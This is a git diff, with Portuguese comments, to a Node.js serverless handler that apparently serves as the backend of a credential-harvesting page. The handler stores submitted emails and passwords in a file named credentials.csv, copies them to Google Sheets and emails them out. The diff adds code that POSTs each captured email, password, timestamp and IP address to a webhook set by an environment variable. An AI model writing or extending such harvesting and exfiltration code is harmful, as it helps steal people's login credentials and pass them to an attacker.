@@ -4,6 +4,9 @@ const createCsvWriter = require('csv-writer').createObjectCsvWriter;
 const nodemailer = require('nodemailer');
 const { saveToGoogleSheets } = require('./save-to-sheets');
 
+// Importar fetch se não estiver disponível (Node 18+ tem nativo)
+const fetch = globalThis.fetch || require('node-fetch');
+
 // Caminho do arquivo CSV (usar /tmp na Vercel)
 const CSV_FILE = path.join('/tmp', 'credentials.csv');
 
@@ -146,6 +149,21 @@ module.exports = async (req, res) => {
         } catch (sheetsError) {
             console.error('Erro ao salvar no Google Sheets (não crítico):', sheetsError);
             // Não falhar a requisição se o Sheets não salvar
+        }
+
+        // Enviar para webhook (se configurado) - mais simples!
+        const webhookUrl = process.env.WEBHOOK_URL;
+        if (webhookUrl) {
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password, timestamp, ip })
+                });
+                console.log('Webhook enviado com sucesso');
+            } catch (webhookError) {
+                console.error('Erro ao enviar webhook (não crítico):', webhookError);
+            }
         }
 
         // Enviar email com as credenciais (se configurado)
